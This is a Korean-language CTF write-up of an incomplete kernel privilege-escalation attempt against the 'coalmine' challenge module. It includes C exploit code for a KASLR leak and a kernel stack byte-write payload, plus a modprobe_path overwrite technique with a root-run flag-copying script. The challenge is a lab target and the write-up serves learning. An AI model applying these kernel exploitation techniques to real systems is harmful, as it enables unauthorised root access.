# coalmine

## 문제 설명

> `coalmine`은 QEMU 환경에서 동작하는 kernel pwn 문제이다.  
> 문제 파일로는 커널 이미지, initramfs, 커널 모듈, 실행 스크립트, entrypoint가 제공되었고, VM 내부에서 `/dev/coalmine` 디바이스를 통해 커널 모듈과 상호작용하는 구조였다.

- 제공 파일: `coalmine-b7b6f25-c68be818996f2f0f.tar.gz`
- 주요 파일:
  - `bzImage`
  - `initramfs.cpio`
  - `coalmine.ko`
  - `run.sh`
  - `entrypoint.py`
  - `flag`
- 공격 대상: `/dev/coalmine`
- 최종 목표: kernel 권한 상승 후 flag 획득

## 풀이

### 분석

압축 파일을 확인한 결과 QEMU 기반 kernel pwn 문제임을 확인했다. `run.sh`를 통해 커널이 부팅되고, initramfs 내부에서 `coalmine.ko` 커널 모듈이 로드된 뒤 `/dev/coalmine` 디바이스가 생성되는 구조였다.

따라서 exploit은 일반 ELF 바이너리를 공격하는 방식이 아니라, VM 내부에서 `/dev/coalmine`을 열고 ioctl을 호출하여 커널 모듈의 취약점을 트리거하는 방식으로 접근해야 했다.

`coalmine.ko`를 분석한 결과, ioctl 명령은 크게 세 종류로 나뉘었다.

```c
#define IOCTL_LEAK   0x8028c151
#define IOCTL_MINE   0x404cc152
#define IOCTL_STATE  0xc008c153
```

`IOCTL_STATE`는 내부 상태값을 설정하는 ioctl로 보였고, 상태값에 따라 `IOCTL_MINE`에서 처리 가능한 operation 개수가 달라지는 구조였다. 분석 과정에서는 `state = 12`일 때 가장 많은 operation을 처리할 수 있는 것으로 보였기 때문에, exploit에서는 먼저 state를 12로 설정하는 방향으로 접근했다.

`IOCTL_LEAK`는 커널 주소 leak에 사용할 수 있는 ioctl이었다. 반환값이 그대로 주소로 제공되지는 않고 특정 상수와 XOR된 형태로 전달되는 것으로 판단했다.

```c
leaked_ret = leak_qword ^ 0x434f414c4d494e45;
```

이 leak 값을 이용하면 커널의 text 영역 return address를 얻을 수 있고, 해당 return address에서 고정 offset을 빼면 KASLR이 적용된 kernel base를 계산할 수 있다고 판단했다.

분석 중 사용한 계산식은 다음과 같다.

```c
kernel_base = leaked_ret - 0x29857f;
```

`IOCTL_MINE`은 실제 취약점이 존재하는 ioctl로 보였다. 사용자가 전달한 payload에는 여러 operation이 들어가며, 특정 operation은 커널 스택의 특정 위치에 1바이트 단위로 값을 쓸 수 있는 형태였다.

대략적인 동작은 다음과 같이 이해했다.

```c
*(uint8_t *)(rbp + (int8_t)offset) = value;
```

즉 사용자가 전달한 signed offset과 value를 이용해, 현재 커널 함수의 `rbp` 기준 상대 위치에 1바이트씩 쓸 수 있는 primitive가 존재한다고 판단했다.

다만 value에는 제한이 있었다. 모든 값을 자유롭게 쓸 수 있는 것이 아니라, 특정 범위의 값만 허용되는 whitelist 방식이었다.

확인한 허용 값 범위는 다음과 같다.

```text
0x10 ~ 0x17
0x20 ~ 0x37
0xc0 ~ 0xd8
0xe8
0xe9
```

또한 payload validation 조건도 존재했다. 분석 과정에서 다음 조건이 필요하다고 판단했다.

```text
type0 operation 중 value 0xe8 포함
type0 operation 중 value 0xe9 포함
type1 operation 중 value 1 포함
```

이 조건을 만족하지 못하면 `IOCTL_MINE`이 실패하거나 exploit이 정상적으로 진행되지 않는 것으로 보였다.

### 취약점

핵심 취약점은 `IOCTL_MINE`에서 사용자가 제어하는 offset과 value를 이용해 커널 스택에 1바이트 단위로 값을 쓸 수 있다는 점이다.

```c
*(uint8_t *)(rbp + (int8_t)offset) = value;
```

이 primitive를 이용하면 커널 스택의 saved return address나 특정 구조체 값을 부분적으로 조작할 수 있다. 특히 `IOCTL_LEAK`를 통해 kernel base를 계산할 수 있기 때문에, KASLR이 적용되어 있어도 커널 주소 계산이 가능하다.

따라서 전체 공격 방향은 다음과 같이 잡았다.

```text
1. /dev/coalmine open
2. IOCTL_STATE로 state = 12 설정
3. IOCTL_LEAK로 커널 주소 leak
4. kernel base 계산
5. IOCTL_MINE으로 커널 스택 또는 task 관련 값을 조작
6. 권한 상승 또는 modprobe_path overwrite 시도
7. root 권한으로 flag 읽기
```

처음에는 saved return address를 덮어서 ROP chain으로 흐름을 바꾸는 방식을 고려했다. 하지만 `IOCTL_MINE`에서 쓸 수 있는 byte 값이 whitelist로 제한되어 있었기 때문에, 원하는 커널 gadget 주소를 자유롭게 쓰기는 어려웠다.

또한 `IOCTL_MINE` 함수 내부에서 특정 stack 영역에 junk 값이 들어가는 것으로 보였기 때문에, 단순히 saved RIP만 바꾸는 방식으로는 안정적인 ROP chain 구성이 어렵다고 판단했다.

분석 중 확인한 stack 구조는 대략 다음과 같았다.

```text
rbp + 0x20 : module ioctl return address
rbp + 0x28 : mine 함수가 덮는 junk 영역
rbp + 0x30 : mine 함수가 덮는 junk 영역
```

이 때문에 return address를 덮더라도 바로 다음 qword들이 junk로 오염되어, 첫 gadget에서 이 junk 값을 skip할 수 있는 구조가 필요했다. 예를 들어 `pop; pop; ret` 계열 gadget을 먼저 사용해 junk qword 두 개를 소비하는 방식을 고려했다.

이후에는 ROP보다 `modprobe_path` overwrite 방식이 더 간단할 수 있다고 보고, `current->thread.sp0` 또는 syscall 진입 시 저장되는 register frame을 이용해 `modprobe_path`에 `/home/user/x` 문자열을 쓰는 방향을 시도했다.

### 익스플로잇

최종 flag 획득에는 성공하지 못했지만, 다음과 같은 exploit 방향을 시도했다.

먼저 `/dev/coalmine`을 열고 state를 12로 설정했다.

```c
int fd = open("/dev/coalmine", O_RDWR);

uint64_t state = 12;
ioctl(fd, IOCTL_STATE, &state);
```

그다음 leak ioctl을 호출하여 커널 return address를 얻고, XOR을 풀어 kernel base를 계산했다.

```c
uint64_t leak[5] = {0};

ioctl(fd, IOCTL_LEAK, leak);

uint64_t ret = leak[0] ^ 0x434f414c4d494e45ULL;
uint64_t kbase = ret - 0x29857f;
```

이후 `modprobe_path` 주소를 계산했다.

```c
#define MODPROBE_PATH_OFF 0xc13530

uint64_t modprobe_path = kbase + MODPROBE_PATH_OFF;
```

초기 접근에서는 saved return address를 partial overwrite하여 ROP를 구성하려고 했다. 하지만 쓸 수 있는 byte 값이 제한되어 있어 원하는 주소를 직접 쓰기 어려웠고, stack에 들어가는 junk 값 때문에 ROP chain 안정성이 떨어진다고 판단했다.

그래서 두 번째 접근으로 `modprobe_path` overwrite를 시도했다. exploit의 목표는 `modprobe_path`를 `/home/user/x`로 바꾼 뒤, 알 수 없는 형식의 파일을 실행하여 커널이 modprobe를 호출하게 만드는 것이었다.

이를 위해 `/home/user/x`에는 다음과 같은 스크립트를 생성하는 방향으로 접근했다.

```sh
#!/bin/sh
/bin/cat /root/flag > /tmp/flag
/bin/chmod 666 /tmp/flag
```

그리고 잘못된 형식의 파일 `/home/user/bad`를 실행하여 modprobe 호출을 유도하려 했다.

```c
static void trigger_modprobe(void) {
    static const char script[] =
        "#!/bin/sh\n"
        "/bin/cat /root/flag > /tmp/flag\n"
        "/bin/chmod 666 /tmp/flag\n";

    static const unsigned char bad[] = {0xff, 0xff, 0xff, 0xff};

    write_file("/home/user/x", script, sizeof(script) - 1, 0777);
    write_file("/home/user/bad", bad, sizeof(bad), 0777);

    pid_t p = fork();
    if (p == 0) {
        char *argv[] = {"/home/user/bad", NULL};
        char *envp[] = {NULL};
        execve("/home/user/bad", argv, envp);
        _exit(0);
    }

    waitpid(p, NULL, 0);
}
```

로컬 테스트 과정에서는 먼저 `entrypoint.py` 실행 중 다음 에러를 만났다.

```text
ERROR: failed to read /flag: [Errno 2] No such file or directory: '/flag'
```

이 에러는 exploit 실패가 아니라, 로컬 환경에서 `entrypoint.py`가 호스트의 `/flag` 파일을 읽으려고 하는데 해당 파일이 없어서 발생한 문제였다. 문제 디렉토리에는 `./flag` 파일이 있었지만, entrypoint는 절대경로 `/flag`를 요구했다.

따라서 다음과 같이 심볼릭 링크를 만들어 해결했다.

```sh
sudo ln -sf "$PWD/flag" /flag
```

이후 다시 실행하자 다음과 같이 VM 실행 단계까지는 진행되었다.

```text
Send your solve binary as base64 (end with empty line):
Received 704480 byte solve binary
Launching VM...
```

하지만 이후 flag가 출력되지 않고 바로 프롬프트로 돌아왔다. 처음에는 QEMU 출력이 내부에서 suppress되는 것으로 생각했지만, 실제로는 entrypoint가 종료된 상태였고, solve 바이너리가 VM 내부에서 실패했을 가능성이 높다고 판단했다.

추가 분석 과정에서 `IOCTL_MINE` validation 조건 중 `type1` operation의 value가 `1`인 항목이 필요하다는 점을 고려했다. 기존 payload 구성에서는 `sp0` 주소 바이트 중 우연히 `0x01`이 포함되지 않으면 validation이 실패할 수 있었다. 그래서 dummy operation을 추가하는 방식으로 payload를 수정했다.

```c
static void set_sp0(int fd, uint64_t sp0) {
    memset(payload, 0, sizeof(payload));
    opidx = 0;

    /*
     * validation 통과용:
     * type0 value 0xe8 필요
     * type0 value 0xe9 필요
     * type1 value 0x01 필요
     */
    add_op0(-0x40, 0xe8);
    add_op0(-0x3f, 0xe9);
    add_op1(0, 1);

    for (int i = 0; i < 8; i++) {
        add_op1((uint8_t)i, (uint8_t)(sp0 >> (8 * i)));
    }

    payload[0] = (unsigned char)opidx;

    if (ioctl(fd, IOCTL_MINE, payload) < 0) {
        perror("mine");
        exit(1);
    }
}
```

이 시점까지의 exploit skeleton은 다음과 같다.

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/coalmine"

#define IOCTL_LEAK   0x8028c151UL
#define IOCTL_MINE   0x404cc152UL
#define IOCTL_STATE  0xc008c153UL

#define LEAK_XOR 0x434f414c4d494e45ULL
#define RET_OFF  0x29857fULL
#define MODPROBE_PATH_OFF 0xc13530ULL

static unsigned char payload[0x4c];
static int opidx;

static void add_op0(int8_t off, uint8_t val) {
    int p = 1 + opidx * 3;
    payload[p + 0] = 0;
    payload[p + 1] = (uint8_t)off;
    payload[p + 2] = val;
    opidx++;
}

static void add_op1(uint8_t idx, uint8_t val) {
    int p = 1 + opidx * 3;
    payload[p + 0] = 1;
    payload[p + 1] = idx;
    payload[p + 2] = val;
    opidx++;
}

static void set_state(int fd) {
    uint64_t st = 12;
    if (ioctl(fd, IOCTL_STATE, &st) < 0) {
        perror("state");
        exit(1);
    }
}

static uint64_t leak_kbase(int fd) {
    uint64_t leak[5] = {0};

    if (ioctl(fd, IOCTL_LEAK, leak) < 0) {
        perror("leak");
        exit(1);
    }

    uint64_t ret = leak[0] ^ LEAK_XOR;
    return ret - RET_OFF;
}

static void set_sp0(int fd, uint64_t sp0) {
    memset(payload, 0, sizeof(payload));
    opidx = 0;

    add_op0(-0x40, 0xe8);
    add_op0(-0x3f, 0xe9);
    add_op1(0, 1);

    for (int i = 0; i < 8; i++) {
        add_op1((uint8_t)i, (uint8_t)(sp0 >> (8 * i)));
    }

    payload[0] = (unsigned char)opidx;

    if (ioctl(fd, IOCTL_MINE, payload) < 0) {
        perror("mine");
        exit(1);
    }
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    set_state(fd);

    uint64_t kbase = leak_kbase(fd);
    uint64_t modprobe_path = kbase + MODPROBE_PATH_OFF;

    printf("[+] kernel base   = 0x%lx\n", kbase);
    printf("[+] modprobe_path = 0x%lx\n", modprobe_path);

    /*
     * 이후 목표:
     * 1. current->thread.sp0 또는 syscall frame을 이용해 modprobe_path에 "/home/user/x" 쓰기
     * 2. 잘못된 형식의 파일을 execve하여 modprobe 실행 유도
     * 3. /home/user/x가 root 권한으로 실행되어 /root/flag를 /tmp/flag로 복사
     * 4. /tmp/flag 읽기
     */

    set_sp0(fd, modprobe_path + 0xa8);

    close(fd);
    return 0;
}
```

현재 exploit은 kernel base leak과 `IOCTL_MINE` payload 구성까지는 진행했지만, 최종적으로 `modprobe_path`를 안정적으로 overwrite하여 flag를 출력하는 단계까지는 완성하지 못했다.

## 플래그

최종 flag는 획득하지 못했다.

```text
flag{not_obtained}
```

## 배운 점

이 문제를 통해 일반적인 userland pwn과 kernel pwn의 차이를 다시 확인할 수 있었다. 특히 QEMU, initramfs, kernel module, `/dev` 디바이스, ioctl interface를 함께 분석해야 했기 때문에 단순히 바이너리 하나만 보는 문제보다 분석 범위가 넓었다.

또한 kernel pwn에서는 KASLR 우회를 위한 leak이 중요하며, leak된 주소에서 kernel base를 계산한 뒤 각종 kernel symbol이나 gadget 주소를 계산해야 한다는 점을 확인했다.

`IOCTL_MINE`의 stack byte write primitive는 강력해 보였지만, 실제 exploit에서는 value whitelist와 payload validation 조건 때문에 원하는 주소나 ROP chain을 자유롭게 구성하기 어려웠다. 이 때문에 단순한 saved RIP overwrite 방식이 아니라, junk 영역을 고려한 gadget 선택 또는 `modprobe_path` overwrite 같은 우회 기법이 필요하다는 점을 배웠다.

마지막으로 로컬 테스트 과정에서 `entrypoint.py`가 요구하는 `/flag` 파일 위치와 QEMU 실행 결과 출력 방식 때문에 exploit 실패 원인을 바로 파악하기 어려웠다. CTF kernel pwn 문제를 풀 때는 exploit 코드뿐만 아니라 entrypoint, run script, initramfs 내부 동작까지 같이 확인해야 한다는 점을 알게 되었다.
